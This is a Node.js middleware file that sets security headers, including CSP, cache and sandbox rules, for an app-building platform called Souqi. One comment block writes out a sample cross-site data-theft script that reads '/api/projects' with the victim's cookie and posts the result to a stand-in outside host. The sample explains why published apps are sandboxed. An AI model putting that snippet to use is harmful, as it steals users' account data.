/* =================================================================
   Souqi — security response headers (dependency-free helmet)
   -----------------------------------------------------------------
   Baseline hardening on every response. HSTS is emitted only in
   production (never on plain-HTTP dev).

   NOTE on CSP: the current console/portal pages rely on inline
   scripts/styles and Google Fonts, so the policy permits
   'unsafe-inline'/'unsafe-eval' for now. Tightening to nonce-based
   script-src is tracked as a Phase 7 follow-up (needs per-page
   nonces + a pass over the inline handlers). Even so, this policy
   blocks plugins/object embeds, framing by other origins and
   base-uri hijacking. Set CSP_DISABLED=1 to omit it if a page needs
   debugging.
   ================================================================= */
"use strict";
const isProd = process.env.NODE_ENV === "production";

// WebContainers (the builder page) need three things this policy did not
// previously allow, and each failure looked like an unexplained build
// error rather than a CSP problem:
//   - the @webcontainer/api module itself, loaded from jsdelivr;
//   - blob: workers — WebContainer runs its virtual Node in Web Workers
//     created from blob URLs, so worker-src blob: is mandatory;
//   - a frame source for the preview: the running client app is served
//     either same-origin via a service worker or from
//     *.webcontainer-api.io, and it renders inside an iframe.
// Named hosts, not wildcards: this widens the policy by three specific
// origins rather than relaxing it.
const WEBCONTAINER_CDN = "https://cdn.jsdelivr.net";
// The runtime frames stackblitz.com for its own licensing/credential
// handshake before it will boot, and serves the running client app from
// *.webcontainer-api.io. Both are required for a preview to appear.
const WEBCONTAINER_HOST = "https://*.webcontainer-api.io https://stackblitz.com";
// The device-mockup preview has a second render path, used whenever
// WebContainers aren't booted yet (every reopened project, briefly, while
// npm install runs) or aren't supported at all (no SharedArrayBuffer —
// most mobile browsers): a CDN-script srcdoc fallback built in code.html's
// showPreview()/renderAppPreview(), which loads Tailwind, React, Babel and
// lucide-react from these three hosts. Missing here, every one of those
// script tags was silently blocked — the preview mockup just stayed
// blank, with no error visible anywhere but the browser console.
const PREVIEW_FALLBACK_CDN = "https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com";

// Stripe Elements, on /checkout. The card fields are iframes served from
// js.stripe.com — that is what keeps the card number out of this origin
// and out of Souqi's PCI scope — and a 3-D Secure challenge is framed
// from hooks.stripe.com. Without the frame-src entries the fields render
// as blank boxes and a card that needs authentication just never clears,
// with the only clue in the browser console.
const STRIPE_SCRIPT = "https://js.stripe.com";
const STRIPE_FRAME = "https://js.stripe.com https://hooks.stripe.com";

// Deployed apps, for the preview thumbnails on /projects and /deployments.
// Every app the deploy plane publishes lives on a subdomain of APP_DOMAIN
// (football.souqi.site, app-ede76579dad1.souqi.site), and framing one was
// blocked by this policy — Chrome rendered the grey broken-content box, which
// looks exactly like the app failing to load rather than us refusing to show
// it. A wildcard over one domain we operate, not a blanket https:.
const APP_DOMAIN = (process.env.APP_DOMAIN || "souqi.site").toLowerCase();
const APP_PREVIEW_FRAME = "https://*." + APP_DOMAIN + " https://" + APP_DOMAIN;

const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' " + WEBCONTAINER_CDN + " " + PREVIEW_FALLBACK_CDN + " " + STRIPE_SCRIPT,
  "worker-src 'self' blob:",
  "child-src 'self' blob: " + WEBCONTAINER_HOST,
  "frame-src 'self' blob: " + WEBCONTAINER_HOST + " " + STRIPE_FRAME + " " + APP_PREVIEW_FRAME,
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  /* http: alongside https:, and it costs nothing where it matters.

     The preview runs the generated app in an OPAQUE origin, so 'self'
     matches nothing there and every image it shows — including the photo
     the person just uploaded — is judged by scheme alone. On souqi.site
     the page is https and the browser blocks http subresources as mixed
     content whatever this says, so the only thing this unblocks is a
     developer running the server on http://localhost, where the hero was
     rendering as alt text. */
  "img-src 'self' data: blob: https: http:",
  "connect-src 'self' https: blob: data:",
  "frame-ancestors 'self'",
  "base-uri 'self'",
  "form-action 'self'",
  "object-src 'none'"
].join("; ");

/* =================================================================
   PUBLISHED APPS GET THEIR OWN ORIGIN
   -----------------------------------------------------------------
   A published app is served from /s/<slug> — on souqi.site itself, the
   same origin as the dashboard. Its JavaScript is written by a model, at
   the direction of whoever published it, and the platform authenticates
   with a cookie and nothing else: no CSRF token, and SameSite=Lax is no
   help at all against a page that IS the same site.

   So, before this, anyone could publish an app whose script did:

       const mine = await (await fetch("/api/projects")).json();
       fetch("https://somewhere-else/collect", { method: "POST",
             body: JSON.stringify(mine) });

   — send the link to someone, and read that person's projects, account
   and usage as them. The first fetch is same-origin so their session
   cookie rides along and the response is readable; the second is allowed
   because the platform CSP ends in connect-src https:, which is every
   host on the internet.

   `sandbox` fixes it at the root rather than by blocklisting: the page
   is loaded into an OPAQUE origin, so it is no longer same-origin with
   anything. /api is cross-origin to it, CORS applies, and the session
   cookie is not sent. What it keeps is everything an app needs to be an
   app — scripts, forms, popups, and a click-driven navigation, which is
   how the Stripe redirect leaves the page.

   allow-same-origin is the one flag deliberately absent. Adding it back
   undoes the whole of this.

   THE TRADE, written down because it is real: an opaque origin has no
   cookies, no localStorage and no IndexedDB, so a published app cannot
   persist anything in the browser. Payments still work — those two
   endpoints are public by design, take no credentials, and now say so in
   CORS. This lands while nothing is published yet, which is the only
   moment it costs nobody anything; after that, someone's app breaks.
   ================================================================= */
const PUBLISHED_CSP = [
  "sandbox allow-scripts allow-forms allow-popups allow-modals" +
    " allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation",
  "default-src 'self'",
  // A generated app legitimately loads its own bundle and inline styles.
  "script-src 'self' 'unsafe-inline' " + PREVIEW_FALLBACK_CDN + " " + WEBCONTAINER_CDN + " " + STRIPE_SCRIPT,
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' data: https://fonts.gstatic.com",
  // Models reach for stock photography constantly; blocking it would break
  // most published apps for no security gain the sandbox does not already
  // give — an opaque origin has nothing worth exfiltrating.
  "img-src 'self' data: blob: https:",
  "connect-src 'self' https:",
  "frame-src 'self' " + STRIPE_FRAME,
  "frame-ancestors 'self'",
  "base-uri 'self'",
  "object-src 'none'"
].join("; ");

/** The published-site route, and only it. */
function isPublishedSite(p) {
  return p === "/s" || p.indexOf("/s/") === 0;
}

module.exports = function securityHeaders(req, res, next) {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

  /* API and auth answers are about WHO IS ASKING, and must never be stored
     by a cache that serves more than one person.

     They carried no Cache-Control at all, so the platform's default applied —
     in production that is "public, max-age=0, must-revalidate". `public` on a
     body containing an account's email address is the wrong default even with
     revalidation, and the only Vary was `Origin`, so nothing in the chain was
     told the answer depends on the session cookie.

     no-store is the correct instruction: do not write this down anywhere.
     res.vary() APPENDS, so the Origin that cors() sets is kept — overwriting
     Vary here would quietly widen CORS caching instead. */
  const p = req.path || "";
  if (p.indexOf("/api/") === 0 || p.indexOf("/auth/") === 0) {
    res.setHeader("Cache-Control", "no-store");
    res.vary("Cookie");
  }
  /* microphone=(self), not (): the composer's voice input is served from
     this origin, and with () the browser refuses getUserMedia and speech
     recognition outright — the mic button raised a permissions-policy
     violation in the console and looked simply dead. Not (*) either:
     generated apps render in iframes here, and none of them should
     inherit the microphone because our own composer uses it. */
  res.setHeader("Permissions-Policy", "geolocation=(), microphone=(self), camera=(self)");
  res.setHeader("X-DNS-Prefetch-Control", "off");
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  /* NO Cross-Origin-Embedder-Policy here, deliberately.

     COEP was set on every page, and a cross-origin IFRAME under COEP has to
     assert its own COEP or the browser blocks the navigation and paints a
     blank frame. credentialless relaxes that for subresources, not for
     frames. The deployed apps send no cross-origin headers at all, so every
     preview thumbnail on /projects and /deployments came out white — with or
     without a sandbox attribute, which is how it was traced here rather than
     to the iframe.

     Only the builder actually needs COEP: WebContainers require cross-origin
     isolation for SharedArrayBuffer. index.js sets it there, on /agent and
     /code alone (see crossOriginIsolate), and vercel.json mirrors that scope
     for the statically served copies. Everywhere else it bought nothing and
     cost the previews. */
  res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
  if (!process.env.CSP_DISABLED) {
    res.setHeader("Content-Security-Policy", isPublishedSite(req.path || "") ? PUBLISHED_CSP : CSP);
  }
  if (isProd) res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  next();
};
